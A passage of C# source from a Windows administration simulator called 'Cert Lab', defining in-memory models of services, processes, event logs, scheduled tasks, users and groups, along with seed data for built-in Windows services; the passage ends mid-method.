// Cert Lab - the administration side of the pretend Windows machines: services (with dependencies and start types),
// processes, the event logs (System, Application, Security, Windows PowerShell, PowerShell/Operational), scheduled
// tasks that run on the simulated clock, local users and groups, Windows features (server), hotfixes and the
// hardware CIM reports. Boot and shutdown write the events Windows writes; actions write theirs (7036, 7040, 4720...).
// Everything is data in memory: nothing here touches the real PC.
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;

namespace CertLab
{
    public class WinService
    {
        public string Name = "", DisplayName = "", Description = "", BinaryPath = "", Account = "LocalSystem", Exe = "svchost";
        public string Status = "Stopped";                 // Stopped, Running, Paused
        public string StartType = "Manual";               // Boot, System, Automatic, Manual, Disabled
        public bool Delayed, TriggerStart, Feature, Deleted, Custom, EverStarted;
        public bool CanPause, CanStop = true, CanShutdown;
        public string ServiceType = "Win32OwnProcess";    // Win32OwnProcess, Win32ShareProcess, KernelDriver
        public readonly List<string> DependsOn = new List<string>();
        public int Pid;
        public int ExitCode;
        public string Group = "";
        public bool Running { get { return Status == "Running" || Status == "Paused"; } }
    }

    public class WinProcess
    {
        public int Id, ParentId, SessionId, Handles = 200, Threads = 8, Priority = 8;
        public string Name = "", Path, User = "NT AUTHORITY\\SYSTEM", CommandLine, Company = "Microsoft Corporation", Description = "", Version = "10.0.20348.1";
        public long Ws = 10485760, Pm = 4194304, Npm = 16384, Vm = 2203318222848L;
        public double Cpu;
        public DateTime Start;
        public bool Exited, Protected;
        public DateTime ExitTime; public int ExitCode;
        public PsRunspace Session;                       // the PowerShell console this process is
        public string Service;                           // the service it runs
        public string MainWindowTitle = "";
    }

    public class WinEvent
    {
        public string Log = "", Provider = "", Message = "", Source, User, Task = "None", Keywords;
        public int Id, Level = 4, Category; public long Qualifiers = -1; public long RecordId;
        public DateTime Time;
        public int Pid = 4, Tid = 8;
        public string[] Strings = new string[0];
        public string ClassicSource { get { return Source ?? Provider; } }
    }

    public class WinLog
    {
        public string Name = "", Display;
        public bool Classic = true, Enabled = true;
        public long MaxKB = 20480;
        public string Overflow = "OverwriteAsNeeded";
        public int Retention;
        public readonly List<WinEvent> Events = new List<WinEvent>();
        public readonly List<string> Sources = new List<string>();
        public long NextRecord = 1;
        public string Path { get { return "%SystemRoot%\\System32\\Winevt\\Logs\\" + Name.Replace("/", "%4") + ".evtx"; } }
    }

    public class WinTaskAction { public string Execute = "", Arguments, WorkingDirectory, Id; }
    public class WinTrigger
    {
        public string Kind = "Once";          // Once, Daily, Weekly, AtStartup, AtLogOn
        public DateTime Start;
        public int DaysInterval = 1, WeeksInterval = 1;
        public List<DayOfWeek> Days = new List<DayOfWeek>();
        public TimeSpan? RepInterval, RepDuration;
        public bool Enabled = true;
        public string User, Delay;
        public string Id;
    }
    public class WinTask
    {
        public string Path = "\\", Name = "", Description, Author, Uri;
        public string State = "Ready";        // Ready, Disabled, Running
        public readonly List<WinTaskAction> Actions = new List<WinTaskAction>();
        public readonly List<WinTrigger> Triggers = new List<WinTrigger>();
        public string UserId = "SYSTEM", LogonType = "ServiceAccount", RunLevel = "Limited", GroupId, Password;
        public bool Hidden, AllowStartIfOnBatteries, StartWhenAvailable, Builtin;
        public string ExecutionTimeLimit = "PT72H", MultipleInstances = "IgnoreNew";
        public int Priority = 7, RestartCount;
        public DateTime? LastRun, NextRun;
        public int LastResult = 267011, MissedRuns;
        public DateTime Date;
        public int Runs;
        public string FullName { get { return Path + Name; } }
    }

    public class WinUser
    {
        public string Name = "", FullName = "", Description = "", Sid = "", Password = "";
        public bool Enabled = true, HasPassword, PasswordNeverExpires, UserMayChangePassword = true, PasswordRequired = true;
        public DateTime? AccountExpires, LastLogon, PasswordLastSet;
        public int Rid;
    }
    public class WinMember { public string Name = "", Class = "User", Source = "Local", Sid = ""; }
    public class WinGroup
    {
        public string Name = "", Description = "", Sid = "";
        public readonly List<WinMember> Members = new List<WinMember>();
    }

    public class WinFeature
    {
        public string Name = "", Display = "", Parent, Type = "Feature", Description = "";
        public string State = "Available";    // Available, Installed, InstallPending, Removed
        public int Depth;
        public bool Restart, ManagementTool, Default;   // Default: installed with its parent
        public string[] Services = new string[0];
        public string[] Requires = new string[0];
    }

    public class WinHotfix { public string Id = "", Description = "Update", By = "NT AUTHORITY\\SYSTEM"; public DateTime On; }

    public partial class PsMachine
    {
        public readonly List<WinService> Services = new List<WinService>();
        public readonly List<WinProcess> Processes = new List<WinProcess>();
        public readonly List<WinLog> EventLogs = new List<WinLog>();
        public readonly List<WinTask> Tasks = new List<WinTask>();
        public readonly List<WinUser> Users = new List<WinUser>();
        public readonly List<WinGroup> Groups = new List<WinGroup>();
        public readonly List<WinFeature> Features = new List<WinFeature>();
        public readonly List<WinHotfix> Hotfixes = new List<WinHotfix>();
        public string MachineSid = "", DomainSid = "S-1-5-21-3623811015-3361044348-30300820";
        public string PendingName;            // Rename-Computer: the name after the next restart
        public long DiskSizeC = 135758377984L, DiskFreeC;
        public string SerialNumber, BiosSerial, ProductId, Uuid;
        public int NextRid = 1001;
        public Random AdminRng;
        public int BootCount;
        /// <summary>Called after a task, a service or a user changes (DSC and graders can listen).</summary>
        public readonly List<Action<string>> AdminListeners = new List<Action<string>>();

        public WinService Svc(string name)
        {
            if (string.IsNullOrEmpty(name)) return null;
            return Services.FirstOrDefault(s => !s.Deleted && s.Name.Equals(name, StringComparison.OrdinalIgnoreCase));
        }
        public WinService SvcByDisplay(string name) { return Services.FirstOrDefault(s => !s.Deleted && s.DisplayName.Equals(name, StringComparison.OrdinalIgnoreCase)); }
        public IEnumerable<WinService> LiveServices { get { return Services.Where(s => !s.Deleted); } }
        public IEnumerable<WinService> Dependents(WinService s) { return LiveServices.Where(x => x.DependsOn.Any(d => d.Equals(s.Name, StringComparison.OrdinalIgnoreCase))); }
        public WinLog EvLog(string name) { return EventLogs.FirstOrDefault(l => l.Name.Equals(name, StringComparison.OrdinalIgnoreCase)); }
        public WinUser FindUser(string name) { return Users.FirstOrDefault(u => u.Name.Equals(StripMachine(name), StringComparison.OrdinalIgnoreCase)); }
        public WinGroup FindGroup(string name) { return Groups.FirstOrDefault(g => g.Name.Equals(StripMachine(name), StringComparison.OrdinalIgnoreCase)); }
        public WinFeature FindFeature(string name) { return Features.FirstOrDefault(f => f.Name.Equals(name, StringComparison.OrdinalIgnoreCase)); }
        public bool FeatureInstalled(string name) { var f = FindFeature(name); return f != null && f.State == "Installed"; }
        public WinTask FindTask(string path, string name)
        {
            return Tasks.FirstOrDefault(t => t.Name.Equals(name, StringComparison.OrdinalIgnoreCase) && (path == null || t.Path.Equals(NormTaskPath(path), StringComparison.OrdinalIgnoreCase)));
        }
        public static string NormTaskPath(string p)
        {
            if (string.IsNullOrEmpty(p)) return "\\";
            p = p.Replace('/', '\\');
            if (!p.StartsWith("\\", StringComparison.Ordinal)) p = "\\" + p;
            if (!p.EndsWith("\\", StringComparison.Ordinal)) p += "\\";
            return p;
        }
        string StripMachine(string n)
        {
            if (n == null) return "";
            int i = n.IndexOf('\\');
            if (i > 0 && (n.Substring(0, i).Equals(Name, StringComparison.OrdinalIgnoreCase) || n.Substring(0, i) == ".")) return n.Substring(i + 1);
            return n;
        }
        public bool WinRmReady { get { var s = Svc("WinRM"); return WinRmListening && s != null && s.Status == "Running"; } }
        public void AdminChanged(string what) { foreach (var l in AdminListeners.ToList()) l(what); }

        public int NewPid()
        {
            int p = NextPid;
            NextPid += 4 * (1 + AdminRng.Next(90));
            return p;
        }

        // ------------------------------------------------------------ events
        public WinEvent Event(string log, string provider, int id, int level, string message, string user)
        {
            return EventAt(Now, log, provider, id, level, message, user);
        }
        public WinEvent EventAt(DateTime t, string log, string provider, int id, int level, string message, string user)
        {
            var l = EvLog(log);
            if (l == null || !l.Enabled) return null;
            var e = new WinEvent { Log = l.Name, Provider = provider, Id = id, Level = level, Message = message, User = user, Time = t, RecordId = l.NextRecord++ };
            e.Qualifiers = QualifiersFor(provider, level);
            if (log == "Security") e.Keywords = level == 0 && id == 4625 || id == 4771 ? "Audit Failure" : "Audit Success";
            if (provider == "DCOM") { e.Source = "DCOM"; e.Provider = "Microsoft-Windows-DistributedCOM"; }
            // keep the log in time order
            int i = l.Events.Count;
            while (i > 0 && l.Events[i - 1].Time > t) i--;
            l.Events.Insert(i, e);
            if (l.Events.Count > 6000) l.Events.RemoveAt(0);
            return e;
        }
        static long QualifiersFor(string provider, int level)
        {
            switch (provider)
            {
                case "Service Control Manager": return level == 2 ? 49152 : level == 3 ? 32768 : 16384;
                case "EventLog": case "User32": case "DCOM": return 32768;
                case "Application Error": case "Windows Error Reporting": case "MsiInstaller": case "VSS": case "ESENT": case "Desktop Window Manager": return 0;
            }
            return -1;
        }
        public string StateWord(string status) { return status == "Running" ? "running" : status == "Paused" ? "paused" : "stopped"; }
        public void ServiceEvent(WinService s, string status) { var e = Event("System", "Service Control Manager", 7036, 4, "The " + s.DisplayName + " service entered the " + StateWord(status) + " state.", null); if (e != null) e.Strings = new[] { s.DisplayName, StateWord(status) }; }
        public static string StartWord(string st, bool delayed)
        {
            switch (st) { case "Automatic": return "auto start"; case "Manual": return "demand start"; case "Disabled": return "disabled"; case "Boot": return "boot start"; case "System": return "system start"; }
            return st;
        }
        public string AdminUserSid { get { return DomainSid + "-500"; } }

        // ------------------------------------------------------------ services: starting and stopping
        /// <summary>Starts a service and the ones it needs. Null on success, else the reason (Win32 error number and text).</summary>
        public string StartService(WinService s, bool log)
        {
            if (s.Running) return null;
            if (s.StartType == "Disabled") return "1058";
            foreach (var d in s.DependsOn)
            {
                var ds = Svc(d);
                if (ds == null) return "1075";
                var why = StartService(ds, log);
                if (why != null) return "1068";
            }
            if (s.Custom && FindFile(ExeOf(s.BinaryPath)) == null) return "2";
            s.Status = "Running";
            s.ExitCode = 0; s.EverStarted = true;
            AttachProcess(s);
            if (log) ServiceEvent(s, "Running");
            if (s.Custom && ServiceStarted != null) ServiceStarted(s);
            return null;
        }
        public static string ExeOf(string bin)
        {
            bin = (bin ?? "").Trim();
            if (bin.StartsWith("\"", StringComparison.Ordinal)) { int e = bin.IndexOf('"', 1); return e > 0 ? bin.Substring(1, e - 1) : bin.Trim('"'); }
            int sp = bin.IndexOf(".exe ", StringComparison.OrdinalIgnoreCase);
            return sp > 0 ? bin.Substring(0, sp + 4) : bin;
        }
        /// <summary>Stops a service (and, with stopDependents, the running services that need it).</summary>
        public string StopService(WinService s, bool stopDependents, bool log)
        {
            if (!s.Running) return null;
            if (!s.CanStop) return "1052";
            var deps = Dependents(s).Where(d => d.Running).ToList();
            if (deps.Count > 0 && !stopDependents) return "1051";
            foreach (var d in deps) StopService(d, true, log);
            s.Status = "Stopped";
            DetachProcess(s);
            if (log) ServiceEvent(s, "Stopped");
            return null;
        }
        public void SetStartType(WinService s, string st, bool log)
        {
            if (s.StartType == st) return;
            if (log) Event("System", "Service Control Manager", 7040, 4, "The start type of the " + s.DisplayName + " service was changed from " + StartWord(s.StartType, false) + " to " + StartWord(st, false) + ".", AdminUserSid);
            s.StartType = st;
        }
        void AttachProcess(WinService s)
        {
            if (s.ServiceType == "KernelDriver" || s.ServiceType == "FileSystemDriver") return;
            if (s.Exe == "lsass" || s.Exe == "services")
            {
                var host = Processes.FirstOrDefault(p => p.Name == s.Exe && !p.Exited);
                s.Pid = host == null ? 0 : host.Id;
                return;
            }
            var proc = NewProcess(s.Exe, s.Exe == "svchost" ? "C:\\Windows\\system32\\svchost.exe" : PathFor(s), 0, ServiceUser(s.Account), ParentOf("services"));
            proc.Service = s.Name;
            proc.CommandLine = s.BinaryPath;
            proc.Description = s.Exe == "svchost" ? "Host Process for Windows Services" : s.DisplayName;
            proc.Ws = (6 + AdminRng.Next(30)) * 1048576L + AdminRng.Next(256) * 4096; proc.Pm = proc.Ws / 2 + AdminRng.Next(64) * 4096; proc.Npm = (10 + AdminRng.Next(40)) * 1024;
            proc.Handles = 120 + AdminRng.Next(900); proc.Cpu = AdminRng.Next(300) / 100.0;
            s.Pid = proc.Id;
        }
        string PathFor(WinService s)
        {
            var e = ExeOf(s.BinaryPath);
            return e.Length > 0 ? e : "C:\\Windows\\System32\\" + s.Exe + ".exe";
        }
        static string ServiceUser(string acct)
        {
            if (acct == "LocalSystem") return "NT AUTHORITY\\SYSTEM";
            if (acct.StartsWith("NT AUTHORITY\\", StringComparison.OrdinalIgnoreCase) || acct.StartsWith("NT Authority\\", StringComparison.Ordinal)) return "NT AUTHORITY\\" + acct.Substring(13).ToUpperInvariant().Replace("LOCALSERVICE", "LOCAL SERVICE").Replace("NETWORKSERVICE", "NETWORK SERVICE");
            return acct;
        }
        void DetachProcess(WinService s)
        {
            var p = Processes.FirstOrDefault(x => x.Id == s.Pid && x.Service == s.Name && !x.Exited);
            if (p != null) EndProcess(p, 0);
            s.Pid = 0;
        }
        int ParentOf(string name) { var p = Processes.FirstOrDefault(x => x.Name == name && !x.Exited); return p == null ? 0 : p.Id; }

        // ------------------------------------------------------------ processes
        public WinProcess NewProcess(string name, string path, int session, string user, int parent)
        {
            var p = new WinProcess { Id = NewPid(), Name = name, Path = path, SessionId = session, User = user, ParentId = parent, Start = Now };
            p.CommandLine = path == null ? null : (path.Contains(" ") ? "\"" + path + "\"" : path);
            p.Version = OsVersion + "." + (IsServer ? "2849" : "4249");
            Processes.Add(p);
            return p;
        }
        public void EndProcess(WinProcess p, int code)
        {
            p.Exited = true; p.ExitTime = Now; p.ExitCode = code;
            Processes.Remove(p);
            if (p.Session != null) { p.Session.Closed = true; Sessions.Remove(p.Session); }
            if (p.Service != null)
            {
                var s = Svc(p.Service);
                if (s != null && s.Pid == p.Id && s.Running)
                {
                    s.Status = "Stopped"; s.Pid = 0; s.ExitCode = 1067;
                    Event("System", "Service Control Manager", 7034, 2, "The " + s.DisplayName + " service terminated unexpectedly.  It has done this 1 time(s).", null);
                }
            }
        }
        /// <summary>The processes now running: the machine's own plus one powershell.exe (and conhost.exe) per open console.</summary>
        public List<WinProcess> LiveProcesses()
        {
            SyncSessionProcesses();
            return Processes.Where(p => !p.Exited).ToList();
        }
        void SyncSessionProcesses()
        {
            foreach (var p in Processes.Where(x => x.Session != null && (x.Session.Closed || !Sessions.Contains(x.Session))).ToList()) { Processes.Remove(p); var ch = Processes.FirstOrDefault(c => c.ParentId == p.Id && c.Name == "conhost"); if (ch != null) Processes.Remove(ch); }
            foreach (var r in Sessions)
            {
                if (r.Closed || Processes.Any(p => p.Session == r)) continue;
                if (r.RemoteFrom != null)
                {
                    Processes.Add(new WinProcess { Id = r.Pid, Name = "wsmprovhost", Path = "C:\\Windows\\system32\\wsmprovhost.exe", SessionId = 0, User = DomainShort + "\\" + r.User, ParentId = ParentOf("svchost"), Start = Now, Session = r, Ws = 70254592, Pm = 59899904, Npm = 29696, Handles = 612, Cpu = 0.75, Description = "Host process for WinRM plug-ins", CommandLine = "C:\\Windows\\system32\\wsmprovhost.exe -Embedding" });
                    continue;
                }
                bool console = r.Console != null;
                var ps = new WinProcess { Id = r.Pid, Name = "powershell", Path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", SessionId = console ? (IsServer ? 2 : 1) : 0, User = r.User == "SYSTEM" ? "NT AUTHORITY\\SYSTEM" : (r.User.Contains("\\") ? r.User : DomainShort + "\\" + r.User), ParentId = ParentOf("explorer"), Start = Now, Session = r, Ws = 78643200 + (r.Pid % 7) * 1253376, Pm = 63258624 + (r.Pid % 5) * 413696, Npm = 30720, Handles = 640 + r.Pid % 90, Cpu = 1.2 + (r.Pid % 9) / 10.0, Threads = 18, Description = "Windows PowerShell", MainWindowTitle = console ? "Administrator: Windows PowerShell" : "", Version = "10.0." + OsBuild + ".1" };
                ps.CommandLine = "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"";
                Processes.Add(ps);
                if (console) Processes.Add(new WinProcess { Id = r.Pid + 12, Name = "conhost", Path = "C:\\Windows\\system32\\conhost.exe", SessionId = ps.SessionId, User = ps.User, ParentId = r.Pid, Start = Now, Ws = 18350080, Pm = 6967296, Npm = 12288, Handles = 260, Cpu = 0.31, Description = "Console Window Host", CommandLine = "\\??\\C:\\Windows\\system32\\conhost.exe 0x4" });
            }
        }

        // ------------------------------------------------------------ seeding
        partial void SeedAdmin()
        {
            AdminRng = new Random(Net.Seed * 977 + Name.Length * 13 + (IsServer ? 5 : 11));
            var r = AdminRng;
            MachineSid = "S-1-5-21-" + (1000000000 + r.Next(1000000000)) + "-" + (1000000000 + r.Next(1000000000)) + "-" + (100000000 + r.Next(900000000));
            DiskSizeC = IsServer ? 135758377984L : 106750734336L;
            DiskFreeC = IsServer ? 104817332224L : 61435711488L;
            SerialNumber = IsServer ? "00454-60000-00001-AA" + (100 + r.Next(800)) : "00329-00000-00003-AA" + (100 + r.Next(800));
            ProductId = SerialNumber;
            BiosSerial = (1000 + r.Next(9000)) + "-" + (1000 + r.Next(9000)) + "-" + (1000 + r.Next(9000)) + "-" + (1000 + r.Next(9000)) + "-" + (1000 + r.Next(9000)) + "-" + (1000 + r.Next(9000)) + "-" + (10 + r.Next(90));
            var ub = new byte[16]; r.NextBytes(ub); Uuid = new Guid(ub).ToString().ToUpperInvariant();
            SeedLogs();
            SeedServices();
            SeedAccounts();
            SeedTasks();
            SeedFeatures();
            SeedHotfixes();
            HKLM.Sub("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").S("ProductId", ProductId);
        }

        void SeedLogs()
        {
            foreach (var n in new[] { "Application", "HardwareEvents", "Internet Explorer", "Key Management Service", "Security", "System", "Windows PowerShell" })
            {
                var l = new WinLog { Name = n };
                if (n == "Internet Explorer") { l.MaxKB = 512; l.Overflow = "OverwriteOlder"; l.Retention = 7; }
                if (n == "Windows PowerShell") l.MaxKB = 15360;
                if (n == "Security") l.MaxKB = IsServer ? 131072 : 20480;
                EventLogs.Add(l);
            }
            foreach (var n in new[] { "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-TaskScheduler/Operational", "Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-WinRM/Operational", "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall", "Setup" })
                EventLogs.Add(new WinLog { Name = n, Classic = false, MaxKB = n.Contains("PowerShell") ? 15360 : 1024, Enabled = !n.Contains("TaskScheduler") });
            Action<string, string[]> src = (log, s) => EvLog(log).Sources.AddRange(s);
            src("System", new[] { "Service Control Manager", "EventLog", "Microsoft-Windows-Kernel-General", "Microsoft-Windows-Kernel-Boot", "Microsoft-Windows-Kernel-Power", "User32", "DCOM", "Microsoft-Windows-Time-Service", "Microsoft-Windows-GroupPolicy", "Microsoft-Windows-WindowsUpdateClient", "Microsoft-Windows-Winlogon", "Microsoft-Windows-DNS-Client", "Tcpip", "NETLOGON", "Microsoft-Windows-Kernel-Processor-Power", "Microsoft-Windows-FilterManager", "Microsoft-Windows-WHEA-Logger" });
            src("Application", new[] { "Application Error", "Windows Error Reporting", "MsiInstaller", "Microsoft-Windows-Security-SPP", "VSS", "ESENT", "Desktop Window Manager", "Microsoft-Windows-RestartManager", "Microsoft-Windows-User Profiles Service", "SecurityCenter", "Microsoft-Windows-Winlogon", "WMI", "Application Hang" });
            src("Security", new[] { "Microsoft-Windows-Security-Auditing", "Microsoft-Windows-Eventlog" });
            src("Windows PowerShell", new[] { "PowerShell" });
            src("Microsoft-Windows-PowerShell/Operational", new[] { "Microsoft-Windows-PowerShell" });
            src("Microsoft-Windows-Windows Defender/Operational", new[] { "Microsoft-Windows-Windows Defender" });
            src("Microsoft-Windows-WinRM/Operational", new[] { "Microsoft-Windows-WinRM" });
            src("HardwareEvents", new string[0]); src("Internet Explorer", new string[0]);
        }

        // name|display|exe|start|status-hint|deps|flags  (flags: p pausable, n not stoppable, d delayed, t trigger, s shutdown)
        static readonly string[] ServiceData = {
            "AppIDSvc|Application Identity|svchost|Manual||RpcSs,CryptSvc,AppID|t|NT Authority\\LocalService|Determines and verifies the identity of an application.",
            "Appinfo|Application Information|svchost|Manual||RpcSs,ProfSvc|t|LocalSystem|Facilitates the running of interactive applications with additional administrative privileges.",
            "AudioSrv|Windows Audio|svchost|Manual*||AudioEndpointBuilder,RpcSs||NT AUTHORITY\\LocalService|Manages audio for Windows-based programs.",
            "BFE|Base Filtering Engine|svchost|Automatic||RpcSs|n|NT AUTHORITY\\LocalService|The Base Filtering Engine (BFE) is a service that manages firewall and Internet Protocol security (IPsec) policies.",
            "BITS|Background Intelligent Transfer Service|svchost|Manual||RpcSs|d|LocalSystem|Transfers files in the background using idle network bandwidth.",
            "BrokerInfrastructure|Background Tasks Infrastructure Service|svchost|Automatic||RpcEptMapper,DcomLaunch,RpcSs|n|LocalSystem|Windows infrastructure service that controls which background tasks can run on the system.",
            "CertPropSvc|Certificate Propagation|svchost|Manual|||t|LocalSystem|Copies user certificates and root certificates from smart cards into the current user's certificate store.",
            "CryptSvc|Cryptographic Services|svchost|Automatic||RpcSs||NT Authority\\NetworkService|Provides cryptographic services such as the catalog database for checking the signatures of Windows files.",
            "DcomLaunch|DCOM Server Process Launcher|svchost|Automatic|||n|LocalSystem|The DCOMLAUNCH service launches COM and DCOM servers in response to object activation requests.",
            "Dhcp|DHCP Client|svchost|Automatic||Afd,tdx,nsi||NT Authority\\LocalService|Registers and updates IP addresses and DNS records for this computer.",
            "Dnscache|DNS Client|svchost|Automatic||nsi|n|NT AUTHORITY\\NetworkService|The DNS Client service (dnscache) caches Domain Name System (DNS) names and registers the full computer name for this computer.",
            "DPS|Diagnostic Policy Service|svchost|Automatic|||d|NT AUTHORITY\\LocalService|The Diagnostic Policy Service enables problem detection, troubleshooting and resolution for Windows components.",
            "EventLog|Windows Event Log|svchost|Automatic|||n|NT AUTHORITY\\LocalService|This service manages events and event logs.",
            "EventSystem|COM+ Event System|svchost|Automatic||rpcss||NT AUTHORITY\\LocalService|Supports System Event Notification Service (SENS), which provides automatic distribution of events to subscribing COM components.",
            "gpsvc|Group Policy Client|svchost|Automatic||RPCSS,Mup|n|LocalSystem|The service is responsible for applying settings configured by administrators for the computer and users through the Group Policy component.",
            "iphlpsvc|IP Helper|svchost|Automatic||RpcSs,nsi,winmgmt,tcpip||LocalSystem|Provides tunnel connectivity using IPv6 transition technologies and IP-HTTPS.",
            "KeyIso|CNG Key Isolation|lsass|Manual||RpcSs|t|LocalSystem|The CNG key isolation service is hosted in the LSA process.",
            "LanmanServer|Server|svchost|Automatic||SamSS,Srv2|ps|LocalSystem|Supports file, print, and named-pipe sharing over the network for this computer.",
            "LanmanWorkstation|Workstation|svchost|Automatic||Bowser,MRxSmb20,NSI|p|NT AUTHORITY\\NetworkService|Creates and maintains client network connections to remote servers using the SMB protocol.",
            "lmhosts|TCP/IP NetBIOS Helper|svchost|Manual||Afd|t|NT AUTHORITY\\LocalService|Provides support for the NetBIOS over TCP/IP (NetBT) service and NetBIOS name resolution for clients on the network.",
            "mpssvc|Windows Defender Firewall|svchost|Automatic||mpsdrv,BFE|n|NT Authority\\LocalService|Windows Defender Firewall helps protect your computer by preventing unauthorized users from gaining access to your computer through the Internet or a network.",
            "MSDTC|Distributed Transaction Coordinator|msdtc|Automatic*||RPCSS,SamSS||NT AUTHORITY\\NetworkService|Coordinates transactions that span multiple resource managers, such as databases, message queues, and file systems.",
            "MSiSCSI|Microsoft iSCSI Initiator Service|svchost|Manual|||t|LocalSystem|Manages Internet SCSI (iSCSI) sessions from this computer to remote iSCSI target devices.",
            "Netlogon|Netlogon|lsass|Automatic||LanmanWorkstation|p|LocalSystem|Maintains a secure channel between this computer and the domain controller for authenticating users and services.",
            "Netman|Network Connections|svchost|Manual||rpcss||LocalSystem|Manages objects in the Network and Dial-Up Connections folder, in which you can view both local area network and remote connections.",
            "netprofm|Network List Service|svchost|Manual||RpcSs,nlasvc||NT AUTHORITY\\LocalService|Identifies the networks to which the computer has connected, collects and stores properties for these networks.",
            "NlaSvc|Network Location Awareness|svchost|Automatic||NSI,RpcSs,TcpIp,Dhcp,Eventlog||NT AUTHORITY\\NetworkService|Collects and stores configuration information for the network and notifies programs when this information is modified.",
            "nsi|Network Store Interface Service|svchost|Automatic||rpcss,nsiproxy|n|NT Authority\\LocalService|This service delivers network notifications (e.g. interface addition/deleting etc) to user mode clients.",
            "PlugPlay|Plug and Play|svchost|Manual*|||n|LocalSystem|Enables a computer to recognize and adapt to hardware changes with little or no user input.",
            "Power|Power|svchost|Automatic|||n|LocalSystem|Manages power policy and power policy notification delivery.",
            "ProfSvc|User Profile Service|svchost|Automatic||RpcSs|n|LocalSystem|This service is responsible for loading and unloading user profiles.",
            "RemoteRegistry|Remote Registry|svchost|Automatic|||dt|NT AUTHORITY\\LocalService|Enables remote users to modify registry settings on this computer.",
            "RpcEptMapper|RPC Endpoint Mapper|svchost|Automatic|||n|NT AUTHORITY\\NetworkService|Resolves RPC interfaces identifiers to transport endpoints.",
            "RpcSs|Remote Procedure Call (RPC)|svchost|Automatic||RpcEptMapper,DcomLaunch|n|NT AUTHORITY\\NetworkService|The RPCSS service is the Service Control Manager for COM and DCOM servers.",
            "SamSs|Security Accounts Manager|lsass|Automatic||RPCSS|n|LocalSystem|The startup of this service signals other services that the Security Accounts Manager (SAM) is ready to accept requests.",
            "Schedule|Task Scheduler|svchost|Automatic||RPCSS,SystemEventsBroker|n|LocalSystem|Enables a user to configure and schedule automated tasks on this computer.",
            "SENS|System Event Notification Service|svchost|Automatic||EventSystem||LocalSystem|Monitors system events and notifies subscribers to COM+ Event System of these events.",
            "SessionEnv|Remote Desktop Configuration|svchost|Manual||RPCSS,LanmanWorkstation||localSystem|Remote Desktop Configuration service (RDCS) is responsible for all Remote Desktop Services and Remote Desktop related configuration and session maintenance activities.",
            "ShellHWDetection|Shell Hardware Detection|svchost|Automatic||RpcSs||LocalSystem|Provides notifications for AutoPlay hardware events.",
            "Spooler|Print Spooler|spoolsv|Automatic||RPCSS,http||LocalSystem|This service spools print jobs and handles interaction with the printer.",
            "SystemEventsBroker|System Events Broker|svchost|Automatic||RpcEptMapper,RpcSs|n|LocalSystem|Coordinates execution of background work for WinRT application.",
            "TermService|Remote Desktop Services|svchost|Manual||RPCSS||NT Authority\\NetworkService|Allows users to connect interactively to a remote computer.",
            "Themes|Themes|svchost|Automatic||||LocalSystem|Provides user experience theme management.",
            "TrustedInstaller|Windows Modules Installer|TrustedInstaller|Manual||||localSystem|Enables installation, modification, and removal of Windows updates and optional components.",
            "UsoSvc|Update Orchestrator Service|svchost|Automatic||rpcss|d|LocalSystem|Manages Windows Updates.",
            "VaultSvc|Credential Manager|lsass|Manual||||LocalSystem|Provides secure storage and retrieval of credentials to users, applications and security service packages.",
            "vmms|Hyper-V Virtual Machine Management|vmms|Automatic||||LocalSystem|Management service for Hyper-V.",
            "W32Time|Windows Time|svchost|Automatic|||t|NT AUTHORITY\\LocalService|Maintains date and time synchronization on all clients and servers in the network.",
            "WdiServiceHost|Diagnostic Service Host|svchost|Manual|||n|NT AUTHORITY\\LocalService|The Diagnostic Service Host is used by the Diagnostic Policy Service to host diagnostics that need to run in a Local Service context.",
            "WinDefend|Microsoft Defender Antivirus Service|MsMpEng|Automatic||RpcSs|n|LocalSystem|Helps protect users from malware and other potentially unwanted software.",
            "WinHttpAutoProxySvc|WinHTTP Web Proxy Auto-Discovery Service|svchost|Manual*||Dhcp|n|NT AUTHORITY\\LocalService|WinHTTP implements the client HTTP stack and provides developers with a Win32 API and COM Automation component for sending HTTP requests.",
            "Winmgmt|Windows Management Instrumentation|svchost|Automatic||RPCSS|ps|localSystem|Provides a common interface and object model to access management information about operating system, devices, applications and services.",
            "WinRM|Windows Remote Management (WS-Management)|svchost|Automatic||RPCSS,HTTP|d|NT AUTHORITY\\NetworkService|Windows Remote Management (WinRM) service implements the WS-Management protocol for remote management.",
            "wuauserv|Windows Update|svchost|Manual||rpcss|t|LocalSystem|Enables the detection, download, and installation of updates for Windows and other programs.",
            "WSearch|Windows Search|SearchIndexer|Automatic||RPCSS,BrokerInfrastructure|d|LocalSystem|Provides content indexing, property caching, and search results for files, e-mail, and other content.",
            "wscsvc|Security Center|svchost|Automatic||RpcSs|d|NT AUTHORITY\\LocalService|The WSCSVC (Windows Security Center) service monitors and reports security health settings on the computer.",
            "XblAuthManager|Xbox Live Auth Manager|svchost|Manual||||LocalSystem|Provides authentication and authorization services for interacting with Xbox Live.",
        };

        void SeedServices()
        {
            // the drivers and kernel pieces other services depend on: present but not listed by Get-Service
            foreach (var d in new[] { "Afd", "tdx", "nsiproxy", "Mup", "Bowser", "MRxSmb20", "Srv2", "mpsdrv", "http", "tcpip", "AppID", "AudioEndpointBuilder" })
            {
                bool user = d == "AudioEndpointBuilder";
                Services.Add(new WinService { Name = d, DisplayName = d == "http" ? "HTTP Service" : d == "tcpip" ? "TCP/IP Protocol Driver" : d == "AudioEndpointBuilder" ? "Windows Audio Endpoint Builder" : d, ServiceType = user ? "Win32ShareProcess" : "KernelDriver", StartType = d == "AppID" ? "Manual" : (user ? (IsServer ? "Manual" : "Automatic") : "System"), Exe = "svchost", BinaryPath = user ? "C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p" : "System32\\drivers\\" + d + ".sys", CanStop = false });
            }
            foreach (var line in ServiceData)
            {
                var p = line.Split('|');
                var s = new WinService { Name = p[0], DisplayName = p[1], Exe = p[2], Description = p[8], Account = p[7] };
                string st = p[3]; bool star = st.EndsWith("*", StringComparison.Ordinal); st = st.TrimEnd('*');
                s.StartType = st;
                if (p[5].Length > 0) s.DependsOn.AddRange(p[5].Split(','));
